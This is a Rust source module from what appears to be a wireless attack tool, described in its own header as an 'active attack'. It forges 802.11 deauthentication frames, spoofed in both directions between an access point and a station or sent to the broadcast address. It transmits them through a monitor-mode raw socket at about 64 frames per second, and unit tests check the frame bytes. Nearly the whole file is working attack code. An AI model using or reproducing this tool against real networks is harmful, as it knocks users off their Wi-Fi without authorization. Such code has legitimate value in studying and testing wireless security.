//! Deauthentication/disassociation frame blaster (active attack).
//!
//! Unicast targets get both directions (ap→sta *and* sta→ap); a broadcast
//! target only gets the AP-side broadcasted deauth — there is no sane
//! reverse direction for the broadcast address.

use std::thread::sleep;
use std::time::Duration;

use anyhow::{Context, Result};
use crossbeam_channel::Sender;

use crate::common::{Event, MacAddr};
use crate::dot11::build_deauth;
use crate::radiotap::INJECT_HDR;
use crate::rawsock::RawSocket;

pub const REASON_UNSPECIFIED: u16 = 1;
pub const REASON_CLASS2: u16 = 6;
pub const REASON_CLASS3: u16 = 7;

/// Pacing between frames: 15 ms ≈ 64 frames/s.
const PACE: Duration = Duration::from_millis(15);
/// Emit [`Event::DeauthSent`] after every this many frames.
const REPORT_EVERY: u64 = 32;

/// Number of frames `blast` will attempt for `count` requested deauths:
/// broadcast → `count` (AP side only), unicast → `2*count` (both directions).
fn burst_plan(ap: &MacAddr, target: &MacAddr, count: u32) -> u64 {
    let _ = ap;
    if target.is_broadcast() {
        u64::from(count)
    } else {
        2 * u64::from(count)
    }
}

/// Rewards: `Some(frame_with_radiotap)` queues for TX.
fn frame_plan(ap: &MacAddr, target: &MacAddr) -> Vec<Vec<u8>> {
    let mut frames = Vec::new();
    let mut push = |f: Vec<u8>| {
        let mut with_hdr = Vec::with_capacity(INJECT_HDR.len() + f.len());
        with_hdr.extend_from_slice(&INJECT_HDR);
        with_hdr.extend_from_slice(&f);
        frames.push(with_hdr);
    };
    // AP side.
    push(build_deauth(ap, target, REASON_CLASS3));
    if !target.is_broadcast() {
        // Client side: forge a deauth from the station towards the AP.
        push(build_deauth(target, ap, REASON_CLASS3));
    }
    frames
}

/// Send `count` deauth rounds against `target` via `sock` (`sock` is bound
/// to a monitor-mode interface by the caller). Rate-limited to ~64 pps with
/// a [`Event::DeauthSent`] progress event every 32 sent frames.
///
/// Retries briefly on EAGAIN (driver TX ring full); any other error aborts.
/// Returns frames actually written to the wire.
pub fn blast(
    sock: &RawSocket,
    ap: &MacAddr,
    target: &MacAddr,
    count: u32,
    tx: &Sender<Event>,
) -> Result<u64> {
    let frames = frame_plan(ap, target);
    let mut sent: u64 = 0;
    let mut last_report: u64 = 0;

    for round in 0..count {
        for f in &frames {
            // EAGAIN-aware send: bounded backoff (~5 × 2 ms), then give up.
            let mut attempt = 0;
            loop {
                match sock.send(f) {
                    Ok(_) => break,
                    Err(ref e) if e.raw_os_error() == Some(libc::EAGAIN) => {
                        attempt += 1;
                        if attempt >= 5 {
                            anyhow::bail!("TX ring stayed full (EAGAIN) after retries");
                        }
                        sleep(Duration::from_millis(2));
                    }
                    Err(e) => {
                        return Err(e)
                            .context("deauth send failed (monitor + packet injection ok?)");
                    }
                }
            }
            sent += 1;
            if sent - last_report >= REPORT_EVERY {
                last_report = sent;
                let _ = tx.send(Event::DeauthSent {
                    ap: *ap,
                    target: *target,
                    count: sent,
                });
            }
            sleep(PACE);
        }
        let _ = round;
    }

    // Final report so the UI sees the exact total even under REPORT_EVERY.
    if sent != last_report {
        let _ = tx.send(Event::DeauthSent {
            ap: *ap,
            target: *target,
            count: sent,
        });
    }
    Ok(sent)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn burst_plan_broadcast_is_count() {
        let ap = "aa:bb:cc:dd:ee:ff".parse::<MacAddr>().unwrap();
        assert_eq!(burst_plan(&ap, &MacAddr::BROADCAST, 10), 10);
        assert_eq!(burst_plan(&ap, &MacAddr::BROADCAST, 0), 0);
    }

    #[test]
    fn burst_plan_unicast_is_double() {
        let ap = "aa:bb:cc:dd:ee:ff".parse::<MacAddr>().unwrap();
        let sta = "11:22:33:44:55:66".parse::<MacAddr>().unwrap();
        assert_eq!(burst_plan(&ap, &sta, 10), 20);
        assert_eq!(burst_plan(&ap, &sta, 1), 2);
    }

    #[test]
    fn frame_plan_broadcast_only_ap_side() {
        let ap = "aa:bb:cc:dd:ee:ff".parse::<MacAddr>().unwrap();
        let frames = frame_plan(&ap, &MacAddr::BROADCAST);
        assert_eq!(frames.len(), 1);
        // Radiotap header prefix present, then deauth FC 0x00c0 little-endian.
        assert!(frames[0].starts_with(&INJECT_HDR));
        assert_eq!(&frames[0][8..10], &0x00c0u16.to_le_bytes());
        // addr1 (802.11 offset 4 → +8 radiotap) = broadcast, addr2 = ap.
        assert_eq!(&frames[0][12..18], &MacAddr::BROADCAST.0);
        assert_eq!(&frames[0][18..24], &ap.0);
    }

    #[test]
    fn frame_plan_unicast_both_directions() {
        let ap = "aa:bb:cc:dd:ee:ff".parse::<MacAddr>().unwrap();
        let sta = "11:22:33:44:55:66".parse::<MacAddr>().unwrap();
        let frames = frame_plan(&ap, &sta);
        assert_eq!(frames.len(), 2);
        // Direction 1: ap → sta  (addr1 = sta, addr2 = ap).
        assert_eq!(&frames[0][12..18], &sta.0);
        assert_eq!(&frames[0][18..24], &ap.0);
        // Direction 2: sta → ap  (addr1 = ap, addr2 = sta).
        assert_eq!(&frames[1][12..18], &ap.0);
        assert_eq!(&frames[1][18..24], &sta.0);
        // Round-trip through the dot11 parser: (transmitter, target).
        let (from2, tgt2) = crate::dot11::parse_deauth(&frames[1][8..]).expect("parse");
        assert_eq!(from2, sta);
        assert_eq!(tgt2, ap);
        let (from1, tgt1) = crate::dot11::parse_deauth(&frames[0][8..]).expect("parse");
        assert_eq!(from1, ap);
        assert_eq!(tgt1, sta);
    }
}
